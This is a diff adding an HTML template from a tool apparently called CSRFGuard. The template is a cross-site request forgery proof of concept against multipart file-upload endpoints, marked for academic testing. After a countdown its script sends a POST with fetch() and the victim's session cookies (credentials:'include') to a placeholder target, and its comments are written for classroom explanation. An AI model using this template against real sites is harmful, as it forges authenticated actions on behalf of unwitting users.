@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<!--
+╔══════════════════════════════════════════════════════════════════╗
+║               CSRFGuard — CSRF Proof of Concept                 ║
+║         FOR AUTHORIZED ACADEMIC TESTING ONLY                    ║
+║  Do not deploy outside a controlled lab environment.            ║
+╚══════════════════════════════════════════════════════════════════╝
+  Template  : Multipart File Upload  (multipart/form-data)
+  Target    : {{ TARGET_URL }}
+  Generated : {{ TIMESTAMP }}
+
+  Why Fetch instead of a plain <form>?
+  ─────────────────────────────────────
+  A plain HTML form with enctype="multipart/form-data" cannot inject a
+  Blob for file fields without user interaction (a file picker).
+  Using Fetch + FormData lets us programmatically build the full multipart
+  payload — including dummy file fields — without any user input.
+  credentials:"include" instructs the browser to attach session cookies,
+  which is the core mechanism of the CSRF attack.
+-->
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>CSRFGuard Multipart PoC — {{ TARGET_URL }}</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: 'Segoe UI', system-ui, sans-serif;
+      background: #0d1117;
+      color: #c9d1d9;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 2rem;
+    }
+
+    .card {
+      background: #161b22;
+      border: 1px solid #30363d;
+      border-radius: 10px;
+      padding: 2rem 2.5rem;
+      max-width: 680px;
+      width: 100%;
+    }
+
+    .badge {
+      display: inline-block;
+      background: #b91c1c;
+      color: #fff;
+      font-size: 0.68rem;
+      font-weight: 700;
+      letter-spacing: 0.12em;
+      text-transform: uppercase;
+      padding: 3px 10px;
+      border-radius: 4px;
+      margin-bottom: .5rem;
+    }
+
+    .badge-mp {
+      display: inline-block;
+      background: #7c3aed;
+      color: #fff;
+      font-size: 0.68rem;
+      font-weight: 700;
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+      padding: 3px 10px;
+      border-radius: 4px;
+      margin-left: 6px;
+      margin-bottom: .5rem;
+    }
+
+    h1   { font-size: 1.1rem; color: #f0f6fc; margin: .6rem 0 .3rem; }
+    .sub { font-size: .8rem;  color: #8b949e; margin-bottom: 1.2rem; }
+    code { font-family: monospace; color: #79c0ff; }
+
+    .note {
+      background: #1c2333;
+      border-left: 3px solid #7c3aed;
+      padding: .75rem 1rem;
+      font-size: .78rem;
+      color: #8b949e;
+      border-radius: 0 4px 4px 0;
+      margin-bottom: 1.4rem;
+      line-height: 1.55;
+    }
+    .note strong { color: #e6edf3; }
+
+    table { width: 100%; border-collapse: collapse; font-size: .82rem; margin-bottom: 1.4rem; }
+    th    { text-align: left; color: #8b949e; font-weight: 600; padding: 4px 8px;
+            border-bottom: 1px solid #30363d; }
+    td    { padding: 5px 8px; color: #c9d1d9; word-break: break-all; }
+    td:first-child { color: #79c0ff; font-family: monospace; }
+
+    .status { font-size: .8rem; color: #8b949e; }
+    #timer  { color: #f0883e; font-weight: 600; }
+
+    footer {
+      margin-top: 1.5rem;
+      padding-top: 1rem;
+      border-top: 1px solid #21262d;
+      font-size: .7rem;
+      color: #484f58;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+
+    <span class="badge">⚠ For Authorized Academic Testing Only</span>
+    <span class="badge-mp">Multipart / File Upload</span>
+
+    <h1>CSRFGuard — File Upload CSRF PoC</h1>
+    <p class="sub">Auto-submitting multipart request to: <code>{{ TARGET_URL }}</code></p>
+
+    <div class="note">
+      <strong>Attack context:</strong> This endpoint uses
+      <code>multipart/form-data</code>. Some CSRF defences (e.g. checking
+      <code>Content-Type</code> for <code>application/json</code>) do not apply
+      here. This PoC injects a dummy empty <code>Blob</code> for file fields —
+      it demonstrates the structural vulnerability without transmitting real
+      file content.
+    </div>
+
+    <table>
+      <tr><th>Field</th><th>Value</th></tr>
+      <tr><td>Target URL</td><td>{{ TARGET_URL }}</td></tr>
+      <tr><td>Method</td><td>POST</td></tr>
+      <tr><td>Encoding</td><td>multipart/form-data</td></tr>
+      <tr><td>File fields</td><td>{{ FILE_FIELD_NAMES }}</td></tr>
+      <tr><td>Generated</td><td>{{ TIMESTAMP }}</td></tr>
+    </table>
+
+    <p class="status">Submitting in <span id="timer">3</span>s…</p>
+
+    <footer>
+      CSRFGuard v1.0 &nbsp;|&nbsp; Authorized academic testing only
+      &nbsp;|&nbsp; {{ TIMESTAMP }}
+    </footer>
+
+  </div>
+
+  <script>
+    /*
+     * Multipart CSRF via Fetch + FormData
+     *
+     * Key points for classroom explanation:
+     *   1. FormData automatically sets the multipart boundary header.
+     *   2. credentials:"include" attaches the victim's session cookies.
+     *   3. new Blob([""]) simulates a file field without a real file —
+     *      the SOP prevents reading files cross-origin, but the empty
+     *      Blob forces the multipart structure that the server expects.
+     */
+    (function () {
+      var n  = 3;
+      var el = document.getElementById('timer');
+      var t  = setInterval(function () {
+        n -= 1;
+        el.textContent = n;
+        if (n <= 0) {
+          clearInterval(t);
+          sendPayload();
+        }
+      }, 1000);
+
+      function sendPayload() {
+        var fd = new FormData();
+
+        // ── Text fields ────────────────────────────────────────────
+        {{ JS_TEXT_FIELDS }}
+
+        // ── File fields (dummy Blob — real content blocked by SOP) ─
+        {{ JS_FILE_FIELDS }}
+
+        fetch('{{ TARGET_URL }}', {
+          method:      'POST',
+          body:        fd,
+          credentials: 'include'   /* ← sends session cookies */
+        })
+        .then(function (r) { console.log('[CSRFGuard PoC] status:', r.status); })
+        .catch(function (e) { console.error('[CSRFGuard PoC] error:', e); });
+      }
+    }());
+  </script>
+</body>
+</html>
